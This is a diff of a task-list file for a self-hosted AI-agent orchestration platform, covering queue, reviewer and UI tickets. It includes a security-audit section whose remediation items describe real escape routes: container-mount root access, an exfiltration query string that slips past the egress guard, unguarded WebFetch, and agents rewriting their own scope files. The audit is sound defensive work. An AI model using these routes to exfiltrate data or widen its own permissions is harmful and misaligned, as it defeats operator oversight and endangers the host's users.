@@ -3,8 +3,7 @@
 ## operator
 
 - [x] Move the ambient cross-chat digest out of the cache-stable prompt…
-      Move the ambient cross-chat digest out of the cache-stable prompt prefix (place it after the…
-      Move the ambient cross-chat digest out of the cache-stable prompt prefix (place it after the cache breakpoint or epoch-pin it per session) and cap+rank it to ~6 scoped entries with a remainder count. A digest that changes on every task state change currently invalidates every chat's KV cache (10x read-cost lever) and injects topically-related distractors that measurably degrade the model (Chroma context-rot). Ref: research-findings-2026-07-15 #1,#4.
+      prefix (place it after the cache breakpoint or epoch-pin it per session) and cap+rank it to ~6 scoped entries with a remainder count. A digest that changes on every task state change currently invalidates every chat's KV cache (10x read-cost lever) and injects topically-related distractors that measurably degrade the model (Chroma context-rot). Ref: research-findings-2026-07-15 #1,#4.
 - [x] Make task dedup two-stage and non-destructive
       at >=0.90 cosine run a cheap LLM same-work check before merging
       merges must supersede-with-link (keep loser provenance, point at winner) never delete; limit dedup comparison to the same scope; record the embedding model name on each task and re-embed on model change. Also route text embeddings through the kept Ollama service (nomic-embed-text) via the existing WORKSHOP_TEXT_EMBED_URL seam, because the lexical vectorizer undershoots on paraphrase (verified: two duplicate task lines scored 0.833, filed as related not merged). Ref: research #7 + operator-verified finding.
@@ -13,33 +12,31 @@
 - [x] Make claim_token a checked monotonic fence
       a per-task generation counter incremented on each (re)claim, validated by compare-and-swap on every .tasks.json mutation (status change, note, completion), rejecting stale generations. A held-but-unchecked UUID does not prevent a resurrected zombie worker's late write from corrupting the store (Kleppmann). Ref: research #5.
 - [x] Size task leases for multi-minute LLM latency and renew them via an…
-      Size task leases for multi-minute LLM latency and renew them via an in-loop heartbeat at <50%…
-      Size task leases for multi-minute LLM latency and renew them via an in-loop heartbeat at <50% of TTL emitted from inside the ralph iteration loop; reclaim only on missed heartbeats, not a fixed wall-clock guess, to avoid spurious reclaims of healthy-but-slow workers. Ref: research #6, Temporal AI-agent guidance.
+      in-loop heartbeat at <50% of TTL emitted from inside the ralph iteration loop; reclaim only on missed heartbeats, not a fixed wall-clock guess, to avoid spurious reclaims of healthy-but-slow workers. Ref: research #6, Temporal AI-agent guidance.
 - [x] Ground the ralph reviewer gate in executed acceptance checks
       every distilled Task carries at least one machine-checkable acceptance assertion (command + expected outcome) where feasible; the reviewer runs them and returns per-criterion {criterion, pass, evidence} plus an overall gate; the worker's own summary/self-report is excluded from the reviewer's context (self-preference bias). Ungrounded LLM self-verification approves wrong work (ICLR'24). Ref: research #2,#6-item1.
 - [x] Upgrade the chat-to-Task distiller schema to emit Anthropic subagent fields
       objective, output format, suggested tools/entry points, explicit boundaries (do not touch X), and an effort class mapped to iteration/token caps. Attacks the largest MAST failure category (specification, 41.8%) at task creation. Ref: research #2-item6,#8.
 - [x] Learnings-store hygiene to prevent the anti-context-rot mechanism…
-      Learnings-store hygiene to prevent the anti-context-rot mechanism becoming a context-rot source
+      becoming a context-rot source
       a fixed prompt-token budget per scope for the injected memory block, near-duplicate merge, and age-out/demote of learnings that stop being retrieved. Ref: research #4-item4,#9.
 - [x] Budget refinements: reserve interactive headroom (admit autonomous work…
-      Budget refinements: reserve interactive headroom (admit autonomous work only up to ~60-70% of…
-      Budget refinements: reserve interactive headroom (admit autonomous work only up to ~60-70% of the rolling 5h budget so operator chats always have room), and meter reviewer + distiller token spend against the same scope budget as the worker (the 15x multi-agent multiplier comes from the auxiliary calls nobody meters); attribution tags (project/task/run/role) on every recorded call. Ref: research #5,#10.
+      only up to ~60-70% of the rolling 5h budget so operator chats always have room), and meter reviewer + distiller token spend against the same scope budget as the worker (the 15x multi-agent multiplier comes from the auxiliary calls nobody meters); attribution tags (project/task/run/role) on every recorded call. Ref: research #5,#10.
 - [x] Circuit breaker half-open probe
       after cool-off, admit exactly one probe task for a scope and only close the breaker on its success; a timer-based full reopen just re-triggers the failure storm. Ref: research #11.
 - [-] Generalize the workshop Agent concept so named scoped agents EMERGE…  (cancelled)
-      Generalize the workshop Agent concept so named scoped agents EMERGE from the shared pipeline with minimal config
+      from the shared pipeline with minimal config
       an Agent = slug + persona/rules + memory scope (learnings+notes) + triggers (event and/or schedule) + autonomy mode + tool grants, with queue/dispatch/budget/self-healing/learning/ambient-digest all shared. A new agent should be definable by slug+persona+trigger alone. Masini is the reference instance (separate process today; do not rebuild it, just make the concept general enough that a masini-like assistant falls out of it). Coordination stays stigmergic, not a heavy central conductor. Design: docs/platform-redesign/unified-agent-model-2026-07-15.md.
 - [-] DEFERRED DECISION (operator must weigh in; gated on the system being…  (cancelled)
-      DEFERRED DECISION (operator must weigh in; gated on the system being tested/proven/matured first)
+      tested/proven/matured first)
       reevaluate the legacy 'clawd' name and clawd service branding (hosting under the clawd-a user can likely stay; the NAME is what to reconsider), and fold a masini-form agent INTO this system defined by our own Agent primitive (slug+persona+trigger on the shared pipeline) rather than the separate clawdbot/Letta process it is today. Discussion item, do NOT act unilaterally. Context: docs/platform-redesign/unified-agent-model-2026-07-15.md.
 - [x] Acceptance/reviewer should require committed work for a task to be marked done
       Today a command acceptance like 'test -f X' passes on an uncommitted file, so a task goes done with an empty receipt (no commit). Ground the done-gate in a committed diff.
 - [x] Receipt summary is empty when the worker exits nonzero but the reviewer…
-      Receipt summary is empty when the worker exits nonzero but the reviewer passes (sentinel missed)
+      passes (sentinel missed)
       Capture the final .result even on a nonzero-but-accepted iteration so the worklog is never blank.
 - [-] Research and design comprehensive plan for Notes app permission system…  (cancelled)
-      Research and design comprehensive plan for Notes app permission system and agent interaction protocols
+      and agent interaction protocols
       (1) audit existing platform docs/workshop-v1 architecture and agent/project model, (2) research and distill core agent role primitives from existing systems (orchestration, autonomy, communication patterns), (3) design folder-level permission model with AI-mediated smart LLM review for access decisions, (4) design generalized agent-to-app/agent-to-agent communication protocols with filtering/redaction/allowlist/transparency options, (5) propose autonomy and strictness settings for projects and jobs (well-scoped vs. exploratory, hands-on vs. hands-off, with inheritance from project to job level), (6) design operator review/approval flow for blocked requests supporting both programmatic rules and textual rules, (7) sketch UI mocks per Workshop Design System and backend architecture; identify which protocols generalize to other apps vs. Notes-specific; coordinate with fable subagent for ideation and research; document comprehensive plan with 2-3 implementation phases in docs/platform-redesign/, marking completion when all five design areas are fully scoped, phases are broken down with specific file/component changes identified, generalization/integration boundaries are explicit, existing systems integration points are mapped, and UI mockups follow Design System guidelines.
 - [x] Deep design pass: agent/app interaction protocols
       Notes resource-access contract, scopedness + autonomy model
@@ -136,10 +133,9 @@
       Start from: the requirements addendum note, T0's entity model, B1 (card-collapse/live-progress) and B2 (run-status/single canonical status) so reconstitution reuses their elements. Read frontend voice-mode files ONLY to understand the current voice path; do not modify them.
       Boundaries: Design + docs only, no shipping. Do NOT modify the voice-mode source files (useVoiceSession.ts, voiceSession.ts) - read-only reference. No multi-tenant guardrails. Cap sub-ticket depth at 2. Do not touch veritusagent.
 - [x] Execute a deep fable review-and-refine pass over the orchestration…
-      Execute a deep fable review-and-refine pass over the orchestration surface entity model and the…
-      Execute a deep fable review-and-refine pass over the orchestration surface entity model and the 16-ticket design set (T0–Z) filed to the workshop queue in this turn. Entry points: the T0 ticket spec, the full 16-ticket set with dependencies, the three requirements addenda notes (orchestration-surface requirements raw, shared-scope context notes, resilience notes), and the eight existing docs/platform-redesign/*-2026-07-16.md docs plus docs/workshop-v1/. Work: read the entity model (Chat/Ticket/Run/Agent vocabulary, lifecycle, state fields, cross-links); trace dependencies (T0→A/B threads→Z) and verify eligibility rules; check for contradictions with the 2026-07-16 material; spot structural gaps (missing entity types, unspecified state transitions, unclear authority boundaries); and assess whether the 16-ticket breakdown is well-scoped, whether clarifying-question flow and blocked-and-escalate flow collide or compose cleanly, whether chat scoping + shared-scope cross-edits will actually work, and whether resilience (compaction, model switch, voice degradation) is addressed. Output: a refined entity-model doc (markdown under docs/platform-redesign/) with all changes ratified + inline notes explaining why, the 16-ticket specs updated to reflect refinements, a summary report (markdown) of what changed and why, and a verification checklist confirming (1) entity model is coherent and internally consistent, (2) all 16-ticket dependency edges are correct and sufficient, (3) all three addenda are incorporated, (4) no contradictions or supersedes with 2026-07-16 docs, (5) no ambiguity in the scoping or authority model. Done when: the model is ready for a worker to execute T0 and unblock the A/B threads with confidence.
+      surface entity model and the 16-ticket design set (T0–Z) filed to the workshop queue in this turn. Entry points: the T0 ticket spec, the full 16-ticket set with dependencies, the three requirements addenda notes (orchestration-surface requirements raw, shared-scope context notes, resilience notes), and the eight existing docs/platform-redesign/*-2026-07-16.md docs plus docs/workshop-v1/. Work: read the entity model (Chat/Ticket/Run/Agent vocabulary, lifecycle, state fields, cross-links); trace dependencies (T0→A/B threads→Z) and verify eligibility rules; check for contradictions with the 2026-07-16 material; spot structural gaps (missing entity types, unspecified state transitions, unclear authority boundaries); and assess whether the 16-ticket breakdown is well-scoped, whether clarifying-question flow and blocked-and-escalate flow collide or compose cleanly, whether chat scoping + shared-scope cross-edits will actually work, and whether resilience (compaction, model switch, voice degradation) is addressed. Output: a refined entity-model doc (markdown under docs/platform-redesign/) with all changes ratified + inline notes explaining why, the 16-ticket specs updated to reflect refinements, a summary report (markdown) of what changed and why, and a verification checklist confirming (1) entity model is coherent and internally consistent, (2) all 16-ticket dependency edges are correct and sufficient, (3) all three addenda are incorporated, (4) no contradictions or supersedes with 2026-07-16 docs, (5) no ambiguity in the scoping or authority model. Done when: the model is ready for a worker to execute T0 and unblock the A/B threads with confidence.
 - [-] Design the note/learning capture model (what to capture, when, at what…  (cancelled)
-      Design the note/learning capture model (what to capture, when, at what granularity)
+      granularity)
       Objective: Define how the orchestrator and agents decide WHAT is worth writing to the knowledge/learning stores, at what granularity and scope, so capture reflects the load-bearing substance of a request or decision rather than latching onto the last salient phrase.
       Output: A committed design doc under docs/platform-redesign/ that specifies: (1) capture triggers (durable preference/correction, decision+why, requirement dump, gotcha) vs non-triggers (transient task detail); (2) a coverage/importance heuristic so a multi-part design dump is captured in full at the right tier, not reduced to a one-liner; (3) how capture maps onto the existing three-tier notes-and-docs policy (scratch / scoped Notes / docs) and the learning-note vs note vs ADR distinction; (4) scope selection (workshop/project/app/agent); (5) the prompting/architecture changes needed so the assistant self-checks 'did I capture the weight of this' before emitting; (6) dedup/update-in-place instead of duplicate notes. Plus an ADR for the capture-importance model if load-bearing.
       Start from: shared/knowledge/notes-and-docs-policy note and the notes-and-docs skill; backend/services/knowledge.py; the learning-note/note prompt contracts in the orchestrator system prompt; the existing 2026-07-16 platform-redesign docs and T0's entity model.
@@ -150,19 +146,19 @@
       Start from: read the existing toolbar play/list controls (the ones flagged in B3) and the task-queue store these tickets file into; reuse src/ui primitives (Table, StatusPill, Button, StateBlock). Do NOT invent a new status vocabulary — five kinds only.
       Boundaries: build the button + honest status surface only; do not fold in the full B1/B2/B3 redesign, do not touch voice-mode files, do not add multi-tenant guardrails. Design + this one control ships; everything else in the 17-ticket set stays design-only.
 - [-] Dispatch smoke test: create the file…  (cancelled)
-      Dispatch smoke test: create the file docs/decisions/queue-dispatch-smoke.md containing exactly the single line
+      docs/decisions/queue-dispatch-smoke.md containing exactly the single line
       dispatch smoke test ok. Do nothing else.
 - [x] Queue drain test alpha: create the file…
-      Queue drain test alpha: create the file docs/decisions/queue-drain-alpha.md containing exactly the single line
+      docs/decisions/queue-drain-alpha.md containing exactly the single line
       alpha ok. Do nothing else.
 - [x] Queue drain test bravo: create the file…
-      Queue drain test bravo: create the file docs/decisions/queue-drain-bravo.md containing exactly the single line
+      docs/decisions/queue-drain-bravo.md containing exactly the single line
       bravo ok. Do nothing else.
 - [x] Queue drain test charlie: create the file…
-      Queue drain test charlie: create the file docs/decisions/queue-drain-charlie.md containing exactly the single line
+      docs/decisions/queue-drain-charlie.md containing exactly the single line
       charlie ok. Do nothing else.
 - [x] Final loop check: create docs/decisions/queue-final-check.md containing…
-      Final loop check: create docs/decisions/queue-final-check.md containing exactly the single line: loop verified
+      exactly the single line: loop verified
       Do nothing else.
 - [-] Add a by-chat usage view to the Usage page  (cancelled)
       stacked-area chart of the last 5 hours, no cap
@@ -190,7 +186,7 @@
       Output: check_pluggable_apps.sh currently runs repo-wide and UNCONDITIONALLY (reviewer.sh:224-230) and tsc -b --noEmit carries a 90s timeout (:192); gate both on whether the diff actually touches the relevant paths. reviewer.sh makes zero model calls, so this is pure wall-clock. Keep the gate's verdicts identical for diffs that DO touch those paths.
       Start from: reviewer.sh:184-230. Single-operator; no multi-tenant guardrails. Don't touch veritusagent or voice-mode.
 - [x] Widen general chat's tool surface and rewrite its persona around the…
-      Widen general chat's tool surface and rewrite its persona around the work-placement principles
+      work-placement principles
       Objective: Let chat actually do small work inline. Today general chat CANNOT: its allowlist is mcp__workshop__query + WebSearch/WebFetch with no Bash/Read/Edit/Write (chat_context.py:1004-1005), so its card-preferring persona is partly just a description of its inability.
       Output: general chat gets a bounded read/small-write tool surface, and persona() is rewritten around the five principles in docs/platform-redesign/work-placement-and-preference-learning-2026-07-18.md - do small things now; hand off what needs the reviewer gate/touches/retry/receipt; offload context-heavy READING to a subagent (not necessarily a ticket); THE OPERATOR'S EXPRESSED WISH OUTRANKS ALL OF IT; say what you handed off in one line. Principles to reason with, not rules that fire.
       Start from: chat_context.py:1004-1005 (allowlist), :679-708 (persona), :166-175 (TASK_PROPOSAL_BUILD_RULE, already close to target), effective_allowed_tools:1065.
@@ -210,7 +206,7 @@
       Start from: learnings.py (record shape :354-363, dedup :340-352, memory_block :569-633), task_scope.apply_learning_note:198-234.
       Boundaries: extend the learnings system, do not replace it - it is well built. Single-operator; no multi-tenant guardrails. Don't touch veritusagent or voice-mode.
 - [-] Let repeated chat preferences earn durability (extend promotion beyond…  (cancelled)
-      Let repeated chat preferences earn durability (extend promotion beyond review: origin)
+      review: origin)
       Objective: A preference stated ten times in chat can currently NEVER become a durable rule.
       Output: promotion counts only provenance sources prefixed `review:` (_BLOCK_ORIGIN learnings.py:388, filtered :434), so chat-captured prefs dedup into one entry with provenance 10 and stay ineligible forever; promoted.jsonl does not even exist yet (zero candidates ever generated). Extend the origin filter so repeated chat signals from DISTINCT occasions can reach candidate state. Keep the existing invariant: promotion proposes, the operator confirms - nothing auto-mints.
       Start from: learnings.py:370-520, promote_when_stable:441, block_origin_sources:428-438; the Review tab wiring at Work.tsx:827,1129,1162. Single-operator; no multi-tenant guardrails. Don't touch veritusagent or voice-mode.
@@ -242,7 +238,7 @@
       Start from: frontend/src/pages/Usage.tsx (current per-app cards + rolling-5h chart + editable cap modal are the pattern to mirror on the toggle); backend usage route feeding that page (grep backend/ for the per-app usage endpoint; extend it to return per-chat series for the last 5h). Reuse the existing chart component if one exists; otherwise mirror it. Confirm the existing pool is keyed by app before naming the toggle.
       Boundaries: Do not change the existing By App view or its cap logic. Do not add a cap, cap editor, or progress bar to the Chat view. Do not add multi-tenant guardrails. Do not touch unrelated pages. No new inline hex or emoji. Do not rebuild the public site unless the change is otherwise complete and verified (then scripts/build_workshop_public.sh).
 - [-] Card linking: task/preference cards link to what they created and back…  (cancelled)
-      Card linking: task/preference cards link to what they created and back to the originating chat
+      to the originating chat
       Objective: A card that filed work must be navigable in both directions, and a card that filed MANY tickets must let you pick which one.
       Output: Cards carry a link to the created ticket(s) and a back-link to the originating chat; a multi-ticket action opens a picker rather than a single destination.
       Start from: shared/knowledge/orchestration-surface-requirements-addendum-re-s-19f743cb2c2.md lines 13-16 (verbatim operator ask). The B1 ticket de5890ca shipped card-collapse/auto-run/related-work but never covered linking or the picker.
@@ -270,8 +266,7 @@
 - [ ] [SEC-C3] Verify inbound IPv6 firewall policy (root)
       Host has globally-routable IPv6 and Redis/Ollama/ComfyUI/SMB/ssh bind [::]. Confirm ufw/ip6tables default-deny inbound on IPv6 for 6379/8188/11434/11435/445/139/22/111. This gates whether the unauth all-interface services are LAN/tailnet-only or internet-exposed. Run: sudo ufw status verbose + sudo ip6tables -L -n. See docs/security-audit-2026-07-18.md.
 - [x] [SEC-C2] Lock down unauthenticated lovelace-redis (:6379, all…
-      [SEC-C2] Lock down unauthenticated lovelace-redis (:6379, all interfaces + IPv6, 413 live keys…
-      [SEC-C2] Lock down unauthenticated lovelace-redis (:6379, all interfaces + IPv6, 413 live keys, no requirepass, protected-mode no). Known RCE via CONFIG SET dir/dbfilename + SAVE. Set requirepass and rebind publish to loopback (or docker net). Also password intergen-redis :6380. Needs stack owner + root for firewall. USAGE-FLAG: LAN clients of lovelace lose direct access. See docs/security-audit-2026-07-18.md.
+      interfaces + IPv6, 413 live keys, no requirepass, protected-mode no). Known RCE via CONFIG SET dir/dbfilename + SAVE. Set requirepass and rebind publish to loopback (or docker net). Also password intergen-redis :6380. Needs stack owner + root for firewall. USAGE-FLAG: LAN clients of lovelace lose direct access. See docs/security-audit-2026-07-18.md.
 - [x] [SEC-C1] Docker-socket access = root-equivalent
       and it is LOAD-BEARING (do not just remove the group)
       CORRECTION to the first-pass finding: the Workshop backend runs user apps as containers via docker compose (services/container_runtime.py), so workshop-backend.service launches uvicorn through `sg docker` (drop-in docker-group.conf) and NEEDS clawd-a in the docker group. `gpasswd -d clawd-a docker` would break the app runner + backend startup. Real consequences to address: (a) any RCE in the backend escalates to host root via the docker socket; (b) clawd-a, benmiriello, simonsays share ONE docker daemon, so the clawd-a<->simonsays cluster separation cannot hold at the docker layer (clawd-a can read every user's files via a container mount - confirmed). Options (architectural, product decision): rootless / per-user Docker daemon (isolates clusters + drops root-equivalence), OR a docker-socket-proxy (e.g. tecnativa) restricting the API to the compose calls the runner makes, OR run the app-runner as a dedicated unprivileged user. Discuss which direction; benmiriello/simonsays docker membership is their own concern. See docs/security-audit-2026-07-18.md C1.
@@ -286,18 +281,16 @@
 - [ ] [SEC-H4] Loopback-bind ComfyUI (:8188, all interfaces, unauthenticated)
       ComfyUI has file R/W + custom-node code-exec surface, LAN+tailnet reachable. Bind loopback (or tailscale IP) and front with an authenticated Serve entry. Owned by another host user + root for firewall. See docs/security-audit-2026-07-18.md.
 - [x] [SEC-H5] Auth-gate or unexpose the :9000 Control Panel (Flask/Werkzeug…
-      [SEC-H5] Auth-gate or unexpose the :9000 Control Panel (Flask/Werkzeug dev server, no auth…
-      [SEC-H5] Auth-gate or unexpose the :9000 Control Panel (Flask/Werkzeug dev server, no auth, mutating service add/start/stop actions) exposed tailnet-wide via Serve 8449. Confirm Flask debug=False (else remote RCE console). Add auth or drop the 8449 Serve mapping. See docs/security-audit-2026-07-18.md.
+      dev server, no auth, mutating service add/start/stop actions) exposed tailnet-wide via Serve 8449. Confirm Flask debug=False (else remote RCE console). Add auth or drop the 8449 Serve mapping. See docs/security-audit-2026-07-18.md.
 - [x] [SEC-H6] Scope the mobile WebView native bridge before building
       It exposes secureStore.get/set/remove to web JS with originWhitelist ['*'] and data:/about: allowed, so any page/XSS can read the device token (full API bearer for bank/location/health) - undermines the HttpOnly cookie design. Replace with write-only provisionDeviceToken(fixed key), restrict originWhitelist to the real origin, reject data:/about:/non-origin subframes. See docs/security-audit-2026-07-18.md.
 - [ ] [SEC-H7] Loopback-bind Ollama (:11435 ollama-bgm + :11434, all…
-      [SEC-H7] Loopback-bind Ollama (:11435 ollama-bgm + :11434, all interfaces/IPv6, unauthenticated)
+      interfaces/IPv6, unauthenticated)
       Open inference API = compute/GPU abuse, arbitrary model pull, local model file R/W, /api/generate SSRF pivot. Set OLLAMA_HOST to loopback; reach only via authenticated open-webui. Stack owner + root. See docs/security-audit-2026-07-18.md.
 - [ ] [SEC-M1] Enforce Letta server password on /v1
       Both clawd-a's letta (:8283) and simonsays's letta-simonsays (:8284) answer /v1 unauthenticated despite LETTA_SERVER_PASS set; loopback is shared so clawd-a can reach simonsays's agent-memory API - the one app-layer cross-cluster gap. Start Letta with the flag that actually requires the password. clawd-a owns :8283; flag :8284 to simonsays. See docs/security-audit-2026-07-18.md.
 - [ ] [SEC-M2] open-wearables: get vendor OAuth/AWS/admin secrets out of…
-      [SEC-M2] open-wearables: get vendor OAuth/AWS/admin secrets out of container env into a…
-      [SEC-M2] open-wearables: get vendor OAuth/AWS/admin secrets out of container env into a non-committed secret store (WHOOP/OURA/FITBIT/GARMIN/STRAVA/SUUNTO/POLAR/ULTRAHUMAN secrets + AWS keys + ADMIN_PASSWORD + SECRET_KEY + RESEND_API_KEY). Stop running the dev frontend on all interfaces (:3100). Fix or stop the crash-looping backend/svix. Compose at workshop/infra/open-wearables/repo. See docs/security-audit-2026-07-18.md.
+      container env into a non-committed secret store (WHOOP/OURA/FITBIT/GARMIN/STRAVA/SUUNTO/POLAR/ULTRAHUMAN secrets + AWS keys + ADMIN_PASSWORD + SECRET_KEY + RESEND_API_KEY). Stop running the dev frontend on all interfaces (:3100). Fix or stop the crash-looping backend/svix. Compose at workshop/infra/open-wearables/repo. See docs/security-audit-2026-07-18.md.
 - [ ] [SEC-M3] sshd: disable password authentication (root)
       All sshd_config lines commented => default PasswordAuthentication yes on :22 (+IPv6). Add a drop-in with PasswordAuthentication no + KbdInteractiveAuthentication no. Needs root. USAGE-FLAG: key-only login - confirm every account/host you log in from has its key installed first. See docs/security-audit-2026-07-18.md.
 - [x] [SEC-M4] Invert Workshop registration default to fail-closed
@@ -305,25 +298,23 @@
 - [x] [SEC-L1] Hygiene: tighten world-readable (0644) auth material
       chmod 600 .runtime/auth.db and infra/letta/.env
       chmod -R go= ~/.claude/file-history. Only benmiriello+root can currently reach these (not simonsays/clawd-b) so defense-in-depth, but needlessly loose. See docs/security-audit-2026-07-18.md.
-- [x] [SEC-L2] Hygiene: stop serving the Vite dev server (:5173)
+- [ ] [SEC-L2] Hygiene: stop serving the Vite dev server (:5173)
       to the tailnet via Serve 8443…
       [SEC-L2] Hygiene: stop serving the Vite dev server (:5173) to the tailnet via Serve 8443 (source/source-map/fs exposure). Drop the mapping or point Serve at the built bundle; if kept set server.fs.strict:true. See docs/security-audit-2026-07-18.md.
 - [x] [SEC-L3] Hygiene: disable FastAPI /docs + /openapi.json in production…
-      [SEC-L3] Hygiene: disable FastAPI /docs + /openapi.json in production on the workshop instances…
-      [SEC-L3] Hygiene: disable FastAPI /docs + /openapi.json in production on the workshop instances (API is 401-gated, but the surface is disclosed). See docs/security-audit-2026-07-18.md.
+      on the workshop instances (API is 401-gated, but the surface is disclosed). See docs/security-audit-2026-07-18.md.
 - [x] [SEC-L4] Mobile hygiene: gate app/debug.tsx (accepts a pasted API token)
       behind __DEV__ so it's stripped from release
       delete the unused cleartext loopback default in lib/api.ts. See docs/security-audit-2026-07-18.md.
 - [ ] [SEC-L5] Hygiene (root): Samba restrict anonymous (anon…
-      [SEC-L5] Hygiene (root): Samba restrict anonymous (anon share-name/username enumeration leaks…
-      [SEC-L5] Hygiene (root): Samba restrict anonymous (anon share-name/username enumeration leaks benmiriello/simonsays) + bind smbd to the intended interface; disable rpcbind :111 on all interfaces if NFS is unused. See docs/security-audit-2026-07-18.md.
+      share-name/username enumeration leaks benmiriello/simonsays) + bind smbd to the intended interface; disable rpcbind :111 on all interfaces if NFS is unused. See docs/security-audit-2026-07-18.md.
 - [x] [SEC-A1] Give the autonomy loop a real execution boundary (execution-side of C1)
       Every autonomous turn (ralph/project_ralph/queue_runner/cron_agent + /tools recursive-claude) runs the same `claude -p` as clawd-a, in the docker group, NO sandbox, full tree R/W + OAuth token; no hook inspects `docker`, so one Bash `docker run -v /:/host` = host root. Untrusted input (Discord/web/task text) reaches this. Fix (with C1): run the autonomy loop under a dedicated LOWER-PRIVILEGE sub-user WITHOUT the docker group, and put the app-runner's docker need behind a socket-proxy/rootless docker. Product decision - discuss direction. See docs/security-audit-2026-07-18-agents.md A1.
 - [ ] [SEC-A2] Stop representing scope/touches/latitude/grants as a security boundary
       they are advisory
       touches is a POST-HOC check on the committed git diff (blocks marking done, not the writes; blind to non-repo writes + subprocess/network; default []=unrestricted). latitude is explicitly advisory. grants/stores bind only code that voluntarily calls services.stores (a Bash cat bypasses them). Agent can rewrite .tasks.json/projects.json/grants.json/agents-*.md (same uid) to widen its own scope/latitude/touches or flip a project sensitivity. chmod is theater (same uid + atomic rewrites). Remediation: document these as coordination/correctness, not confinement; real confinement comes from A1. See docs/security-audit-2026-07-18-agents.md A2.
 - [x] [SEC-A3] Extend the egress guard to WebFetch (completes an existing…
-      [SEC-A3] Extend the egress guard to WebFetch (completes an existing control, not new cruft)
+      control, not new cruft)
       egress-guard.py matches Bash ONLY, so WebFetch/WebSearch exfiltrate freely (the guard's own error even redirects agents to WebFetch); it is hostname-only (curl https://allowed-host/?leak=SECRET passes); it FAILS OPEN in a private-project cwd and on any parse error. Add a PreToolUse matcher for WebFetch applying the same host policy + rejecting data-bearing query strings to non-allowlisted hosts. CAUTION: egress-guard.py is user-scope and SHARED with the masini bridge - test both surfaces, don't break legit research fetches. touches ~/.claude/hooks/egress-guard.py + ~/.claude/settings.json. See docs/security-audit-2026-07-18-agents.md A3.
 - [x] [SEC-A4] Clamp recursive claude spawns
       /tools/cloud_run_claude + cloud_run_ralph (services/letta_tools/cloud.py) take caller-supplied max_turns + model (incl opus) with NO clamp, only a per-call timeout; no depth/concurrency/token guard. /tools is origin-gated only (loopback+docker bridge, no identity), and an agent can also call `claude -p` directly in Bash (bypassing the sweep usage_ledger budget). One injected turn = unbounded fan-out/token burn. Clamp max_turns + restrict model server-side in cloud.py; add a simple depth/concurrency guard. Cost-control, not gating. See docs/security-audit-2026-07-18-agents.md A4.
@@ -341,13 +332,12 @@
       Start from: frontend/src/components/Chat.tsx (newChat @965, openThread @951, the [scope] mount effect @856, hydrate @835, sendBuild @995, submitText @1026, the conversation <select> @1231, slash /new + /clear @1100). frontend/src/lib/chat.ts (createThread/listThreads/getThread). backend/routes/chat.py + backend/services/chat_store.py are the backend contract (already sound; only extend if an explicit reset endpoint is warranted). Reproduce as app user 6 (benmiriello@gmail.com), not Linux UID.
       Boundaries: Do NOT change the backend turn/model/streaming logic, the SSE reconnect path, or the voice session internals (useVoiceSession). Do NOT alter chat_store persistence format or the compaction/distillation logic. Follow frontend/CLAUDE.md (src/ui primitives, tokens not hex, lucide not emoji); no new inline styles beyond what already exists. No multi-tenant guardrails. Keep the change confined to the chat lifecycle/state-sync; do not redesign the toolbar or transcript rendering.
 - [x] Locate and remove the global default border rule in the app's base…
-      Locate and remove the global default border rule in the app's base styling that's cascading…
-      Locate and remove the global default border rule in the app's base styling that's cascading unwanted borders onto the chat composer, model picker, scope picker, and similar components. The borders should be removed at the source (global stylesheet or reset) rather than overriding them per-component. After the fix, run `bash scripts/check_design.sh` and `cd frontend && npx tsc --noEmit` to verify no new design violations are introduced, then build and confirm the chat and picker controls no longer have doubled or decorative borders.
+      styling that's cascading unwanted borders onto the chat composer, model picker, scope picker, and similar components. The borders should be removed at the source (global stylesheet or reset) rather than overriding them per-component. After the fix, run `bash scripts/check_design.sh` and `cd frontend && npx tsc --noEmit` to verify no new design violations are introduced, then build and confirm the chat and picker controls no longer have doubled or decorative borders.
 - [x] Implement the inbox system per section 8.4 of…
-      Implement the inbox system per section 8.4 of docs/platform-redesign/agent-interaction-model-2026-07-31.md
+      docs/platform-redesign/agent-interaction-model-2026-07-31.md
       create a global inbox component rendered above the chat transcript appearing only when non-empty, displaying items typed by notify/question/review with associated agent/ticket metadata; each item supports dismiss and promote-to-chat actions; implement per-chat scope filtering so items only appear when the chat's scope is connected to or above the item's source scope; wire inbox population from agent messages raising notifications, tickets awaiting review, and agents raising questions/elicitations; ensure items disappear when dismissed or promoted to the chat; verify implementation with tsc, check_design.sh, and end-to-end testing across all three item type scenarios.
-- [ ] Execute P5 (Run → Session rename) and P6 (memory layers) per §8 of…
-      Execute P5 (Run → Session rename) and P6 (memory layers) per §8 of `docs/platform-redesign/agent-interaction-model-2026-07-31.md`. P5 consolidates vocabulary ,  audit every reference to "Run" as a session and rename where semantically accurate (model, fields, routes, UI). P6 implements role-scoped learning: add `role:<role>` as a scope kind to `services/knowledge.py`, agents now read the union of `workshop` + their role + their place + private notes (narrowest wins), writes go to the narrowest scope, and notes confirmed in 3+ distinct scopes surface as `review` items in the inbox for promotion. Both must be schema-clean (`tsc --noEmit`), design-clean (`check_design.sh`), integrated end-to-end (test a mention that triggers promotion logic), and the backend must restart and serve all new routes verified live (tsc, design, `reviewer.sh` approval, committed before emitting completion sentinel).
+- [ ] Execute P5 (Run → Session rename) and P6 (memory layers)
+      per §8 of `docs/platform-redesign/agent-interaction-model-2026-07-31.md`. P5 consolidates vocabulary ,  audit every reference to "Run" as a session and rename where semantically accurate (model, fields, routes, UI). P6 implements role-scoped learning: add `role:<role>` as a scope kind to `services/knowledge.py`, agents now read the union of `workshop` + their role + their place + private notes (narrowest wins), writes go to the narrowest scope, and notes confirmed in 3+ distinct scopes surface as `review` items in the inbox for promotion. Both must be schema-clean (`tsc --noEmit`), design-clean (`check_design.sh`), integrated end-to-end (test a mention that triggers promotion logic), and the backend must restart and serve all new routes verified live (tsc, design, `reviewer.sh` approval, committed before emitting completion sentinel).
 - [ ] Audit the toolbar and chat-adjacent pages (runs, jobs, agents)
       against the platform redesign…
       Audit the toolbar and chat-adjacent pages (runs, jobs, agents) against the platform redesign docs to identify all stale, broken, or unlinked controls. Design a complete toolbar and navigation system that removes dead controls (person+, play icon), integrates the inbox bell properly, and ensures runs/jobs/agents pages are designed per the Workshop Design System, linked bidirectionally to their originating chats, and navigable without getting stuck on orphaned pages. The redesign should identify what stays (with rationale), what's removed, what changes, and how each piece integrates ,  then execute it as one coherent, complete overhaul rather than incremental additions. Acceptance: toolbar shows only controls with real behavior, inbox items open pages that link back to their chat, runs/jobs/agents pages display per DS standards with clear ownership/status/action, and mobile layout has predictable spacing with no broken scroll or hidden navigation.
